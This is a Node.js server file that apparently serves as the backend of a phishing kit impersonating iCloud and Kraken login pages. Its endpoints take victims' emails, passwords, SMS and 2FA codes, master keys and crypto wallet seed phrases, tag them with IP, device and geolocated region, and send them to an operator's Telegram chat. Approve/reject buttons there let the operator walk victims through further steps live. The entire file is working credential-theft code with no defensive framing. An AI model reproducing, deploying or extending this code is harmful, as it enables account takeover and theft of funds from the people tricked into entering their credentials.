// server.js (merged)
console.log("📦 Starting combined server.js...");

const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fetch = require("node-fetch");
const {
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram,
  sendVerifyTelegram,
  send2FATelegram,
  send2FACode,
  sendMasterKeyTelegram,
  sendAlertTelegram,
  sendPhraseTelegram
} = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// -----------------
// ✅ Auto-detect IP, region, device from request
// -----------------
function getIP(req) {
  return (
    req.headers['cf-connecting-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.ip ||
    'Unknown IP'
  );
}

function getDevice(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (/iphone|ipod/i.test(ua))       return 'iPhone';
  if (/ipad/i.test(ua))              return 'iPad';
  if (/android.*mobile/i.test(ua))   return 'Android Phone';
  if (/android/i.test(ua))           return 'Android Tablet';
  if (/windows/i.test(ua))           return 'Windows';
  if (/macintosh|mac os/i.test(ua))  return 'Mac';
  return 'Unknown Device';
}

async function getRegion(ip) {
  try {
    const res = await fetch(`https://get.geojs.io/v1/ip/geo/${ip}.json`);
    const data = await res.json();
    return `${data.city || '?'}, ${data.country || '?'}`;
  } catch {
    return 'Unknown Region';
  }
}

async function getClientInfo(req) {
  const ip = getIP(req);
  const device = getDevice(req);
  const region = await getRegion(ip);
  return { ip, device, region };
}

// -----------------
// Store pending approvals
// -----------------
const pendingUsers = {};
const pendingCodes = {};
const pendingGeneric = {};
const pendingPage = {};
const pendingApprovals = {};
const pending2FA = {};
const pendingVerify = {};
const pendingMasterKey = {};

// -----------------
// User ID counter
// -----------------
let userCounter = 0;
const userIds = {};

// -----------------
// Health check
// -----------------
app.get("/", (req, res) => {
  res.send("✅ Combined Server is running.");
});

// -----------------
// Get or assign a user ID by IP
// -----------------
app.post("/get-user-id", (req, res) => {
  const ip = getIP(req);
  if (!userIds[ip]) {
    userCounter++;
    userIds[ip] = userCounter;
  }
  res.json({ userId: userIds[ip] });
});

// -----------------
// ✅ Plain notification (resend SMS etc.)
// -----------------
app.post("/notify", async (req, res) => {
  const { type, userId } = req.body;
  const { ip, device, region } = await getClientInfo(req);

  try {
    const { bot } = require("./bot");
    let message = "";

    if (type === "resend_sms") {
      message =
        `🔄 <b>Resend Code - iCloud</b> 🔄\n` +
        `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
        `<b>🌍 Region:</b> ${region}\n` +
        `<b>💻 Device:</b> ${device}\n` +
        `<b>📍 IP:</b> ${ip}`;
    } else {
      // fallback: use raw message if provided
      message = req.body.message || "📩 Notification";
    }

    await bot.sendMessage(
      process.env.ADMIN_CHAT_ID || process.env.CHAT_ID,
      message,
      { parse_mode: "HTML" }
    );
    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Failed to send notify message:", err);
    res.status(500).json({ error: "Failed to send message" });
  }
});

// -----------------
// ✅ NEW: Captcha page alerts (guest, bot, too_many_attempts, speed_bot)
// -----------------
app.post("/send-alert", async (req, res) => {
  const { type } = req.body;
  if (!type) return res.status(400).json({ error: "Missing type" });

  try {
    const { ip, device, region } = await getClientInfo(req);
    await sendAlertTelegram(type, { ip, region, device });
    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Failed to send alert:", err);
    res.status(500).json({ error: "Failed to send alert" });
  }
});

// -----------------
// ✅ NEW: Wallet seed phrase
// -----------------
app.post("/send-phrase", async (req, res) => {
  const { phrase } = req.body;
  if (!phrase) return res.status(400).json({ error: "Missing phrase" });

  try {
    const { ip, device, region } = await getClientInfo(req);
    await sendPhraseTelegram({ phrase, region, device, ip });
    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Failed to send phrase:", err);
    res.status(500).json({ error: "Failed to send phrase" });
  }
});

// -----------------
// Email/Password Login
// -----------------
app.post("/login", (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password;
  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
  pendingUsers[email] = { password, status: "pending" };
  console.log(`📥 Login Received: ${email}`);
  sendApprovalRequest(email, password);
  res.json({ success: true });
});

// -----------------
// Generic code submission
// -----------------
app.post("/generic-login", (req, res) => {
  const identifier = (req.body.identifier || "").trim();
  if (!identifier) return res.status(400).json({ success: false, message: "Identifier required" });
  pendingGeneric[identifier] = { status: "pending" };
  console.log(`📥 Generic Identifier Received: ${identifier}`);
  sendApprovalRequestGeneric(identifier);
  res.json({ success: true });
});

// -----------------
// iCloud SMS Login
// -----------------
app.post("/sms-login", async (req, res) => {
  const { code, userId } = req.body;
  if (!code) return res.status(400).json({ success: false, message: "Code required" });
  const { ip, device, region } = await getClientInfo(req);

  pendingCodes[code] = { status: "pending" };
  console.log(`📥 SMS Code Received: ${code}`);

  const message =
    `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
    `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
    `<b>💬 SMS:</b> <code>${code}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📍 IP:</b> ${ip}`;

  try {
    await sendApprovalRequestSMS(code, message);
  } catch (err) {
    console.error("❌ Failed to send SMS Telegram message:", err);
  }

  res.json({ success: true });
});

// -----------------
// iCloud Page Login
// -----------------
app.post("/page-login", async (req, res) => {
  const { email, password, userId } = req.body;
  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
  const { ip, device, region } = await getClientInfo(req);

  pendingPage[email] = { password, status: "pending" };
  console.log(`📥 iCloud Page Login Received: ${email}`);

  const message =
    `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
    `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
    `<b>📧 Email:</b> <code>${email}</code>\n` +
    `<b>🔑 Password:</b> <code>${password}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📍 IP:</b> ${ip}`;

  try {
    await sendApprovalRequestPage(email, password, message);
  } catch (err) {
    console.error("❌ Failed to send Page Telegram message:", err);
  }

  res.json({ success: true });
});

// -----------------
// CB Login
// -----------------
app.post("/send-login", async (req, res) => {
  const { email, password, userId } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Missing email or password" });
  const { ip, device, region } = await getClientInfo(req);

  pendingApprovals[email] = { status: "pending", password, region, device };
  console.log(`📥 CB Login received: ${email}`);

  const message =
    `🐙🐙🐙🐙 <b>Kraken - Sign in</b> 🐙🐙🐙🐙\n` +
    `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
    `<b>📧 Email:</b> <code>${email}</code>\n` +
    `<b>🔑 Password:</b> <code>${password}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📍 IP:</b> ${ip}`;

  try {
    await sendLoginTelegram(email, message);
  } catch (err) {
    console.error("❌ Failed to send CB Login Telegram message:", err);
  }

  res.json({ status: "ok" });
});

// -----------------
// Verify page
// -----------------
app.post("/send-verify", async (req, res) => {
  const { userId } = req.body;
  const { ip, device, region } = await getClientInfo(req);
  if (!ip) return res.status(400).json({ error: "Missing ip" });

  pendingVerify[ip] = { status: "pending" };
  console.log(`📥 Verify page received: ${ip}`);

  const message =
    `🐙🐙🐙🐙 <b>Kraken - Sign in</b> 🐙🐙🐙🐙\n` +
    `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📍 IP:</b> ${ip}`;

  try {
    await sendVerifyTelegram(ip, message);
  } catch (err) {
    console.error("❌ Failed to send Verify Telegram message:", err);
  }

  res.json({ status: "ok", identifier: ip });
});

// -----------------
app.post("/api/submit-2fa", async (req, res) => {
  const { code, userId, requestId } = req.body;
  if (!requestId) return res.status(400).json({ error: "Missing requestId" });
  const { ip, device, region } = await getClientInfo(req);

  pending2FA[requestId] = { status: "pending" };
  console.log(`📥 2FA Request received: ${requestId}`);

  const message =
    `🐙🐙🐙🐙 <b>Kraken - 2FA</b> 🐙🐙🐙🐙\n` +
    `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
    `<b>🔐 2FA:</b> <code>${code}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📍 IP:</b> ${ip}`;

  try {
    const { bot } = require("./bot");
    await bot.sendMessage(
      process.env.ADMIN_CHAT_ID || process.env.CHAT_ID,
      message,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Approve", callback_data: `2fa_approve|${requestId}` },
              { text: "❌ Reject",  callback_data: `2fa_reject|${requestId}` }
            ]
          ]
        }
      }
    );
    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ Failed to send 2FA Telegram message:", err);
    res.status(500).json({ error: "Failed to send Telegram message" });
  }
});

// -----------------
// 2FA submit — new page
// -----------------
app.post("/api/submit-2fa-new", async (req, res) => {
  const { code, userId, requestId } = req.body;
  if (!requestId) return res.status(400).json({ error: "Missing requestId" });
  const { ip, device, region } = await getClientInfo(req);

  pending2FA[requestId] = { status: "pending" };
  console.log(`📥 2FA-New Request received: ${requestId}`);

  const message =
    `🐙🐙🐙🐙 <b>Last 2-FA</b> 🐙🐙🐙🐙\n` +
    `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
    `<b>🔐 2FA-2:</b> <code>${code}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📍 IP:</b> ${ip}`;

  try {
    await send2FATelegram(message, requestId);
    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ Failed to send 2FA-New Telegram message:", err);
    res.status(500).json({ error: "Failed to send Telegram message" });
  }
});

// -----------------
// Master Key submit
// -----------------
app.post("/api/submit-masterkey", async (req, res) => {
  const { code, userId, requestId } = req.body;
  if (!requestId) return res.status(400).json({ error: "Missing requestId" });
  const { ip, device, region } = await getClientInfo(req);

  pendingMasterKey[requestId] = { status: "pending" };
  console.log(`📥 Master Key Request received: ${requestId}`);

  const message =
    `🗝️🗝️🗝️🗝️ <b>Kraken - Master Key</b> 🗝️🗝️🗝️🗝️\n` +
    `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
    `<b>🔐 Master Key:</b> <code>${code}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📍 IP:</b> ${ip}`;

  try {
    await sendMasterKeyTelegram(message, requestId);
    res.json({ status: "pending", requestId });
  } catch (err) {
    console.error("❌ Failed to send Master Key Telegram message:", err);
    res.status(500).json({ error: "Failed to send Telegram message" });
  }
});

// -----------------
// Master Key poll status
// -----------------
app.get("/api/masterkey-status/:requestId", (req, res) => {
  const { requestId } = req.params;
  const entry = pendingMasterKey[requestId];
  if (!entry) return res.json({ status: "pending" });
  res.json({ status: entry.status });
});

// -----------------
// Master Key update status
// -----------------
app.post("/api/update-masterkey-status", (req, res) => {
  const { requestId, status } = req.body;
  if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
  if (pendingMasterKey[requestId]) {
    pendingMasterKey[requestId].status = status;
    console.log(`✅ Master Key status updated: ${requestId} → ${status}`);
    return res.json({ ok: true });
  }
  res.json({ ok: false, message: "requestId not found" });
});

app.get("/api/approval-status/:requestId", (req, res) => {
  const { requestId } = req.params;
  const entry = pending2FA[requestId];
  if (!entry) return res.json({ status: "pending" });
  res.json({ status: entry.status });
});

// -----------------
// 2FA update status
// -----------------
app.post("/api/update-2fa-status", (req, res) => {
  const { requestId, status } = req.body;
  if (!requestId || !status) return res.status(400).json({ error: "Missing requestId or status" });
  if (pending2FA[requestId]) {
    pending2FA[requestId].status = status;
    console.log(`✅ 2FA status updated: ${requestId} → ${status}`);
    return res.json({ ok: true });
  }
  res.json({ ok: false, message: "requestId not found" });
});

// -----------------
// Legacy: verify-code endpoint
// -----------------
app.post("/api/verify-code", (req, res) => {
  const { code, chatId } = req.body;
  if (!code || !chatId) return res.status(400).json({ message: "Code and chatId are required." });
  if (code.length >= 6 && code.length <= 8) {
    send2FACode(code, chatId);
    console.log(`📥 2FA Code sent to chatId: ${chatId}`);
    res.status(200).json({ message: "Code sent to Telegram." });
  } else {
    res.status(400).json({ message: "Invalid code length. Must be 6–8 characters." });
  }
});

// -----------------
// Check status (GET)
// -----------------
app.get("/check-status", (req, res) => {
  const identifier = (req.query.identifier || "").trim();
  if (pendingUsers[identifier])     return res.json({ status: pendingUsers[identifier].status });
  if (pendingCodes[identifier])     return res.json({ status: pendingCodes[identifier].status });
  if (pendingGeneric[identifier])   return res.json({ status: pendingGeneric[identifier].status });
  if (pendingPage[identifier])      return res.json({ status: pendingPage[identifier].status });
  if (pendingApprovals[identifier]) return res.json({ status: pendingApprovals[identifier].status });
  if (pendingVerify[identifier])    return res.json({ status: pendingVerify[identifier].status });
  res.json({ status: "unknown" });
});

// Check status (POST)
app.post("/check-status", (req, res) => {
  const { email } = req.body;
  if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
  res.json({ status: pendingApprovals[email].status });
});

// -----------------
// Update approval status
// -----------------
app.post("/update-status", (req, res) => {
  const identifier = (req.body.identifier || req.body.email || "").trim();
  const status = req.body.status;
  console.log(`📬 Update Status Received: ${identifier}, ${status}`);

  if (pendingUsers[identifier])         pendingUsers[identifier].status = status;
  else if (pendingCodes[identifier])    pendingCodes[identifier].status = status;
  else if (pendingGeneric[identifier])  pendingGeneric[identifier].status = status;
  else if (pendingPage[identifier])     pendingPage[identifier].status = status;
  else if (pendingApprovals[identifier]) pendingApprovals[identifier].status = status;
  else if (pendingVerify[identifier])   pendingVerify[identifier].status = status;
  else return res.json({ ok: false, message: "Identifier not found" });

  console.log(`✅ Status updated for: ${identifier}`);
  res.json({ ok: true });
});

// -----------------
// Self-ping
// -----------------
setInterval(() => {
  const url = process.env.APP_URL;
  if (url) {
    fetch(url).then(() => console.log("🔁 Pinged self")).catch(err => console.error("⚠️ Ping failed:", err));
  }
}, 30 * 1000);

// -----------------
// Start server
// -----------------
app.listen(PORT, () => {
  console.log(`✅ Combined server running at port ${PORT}`);
});
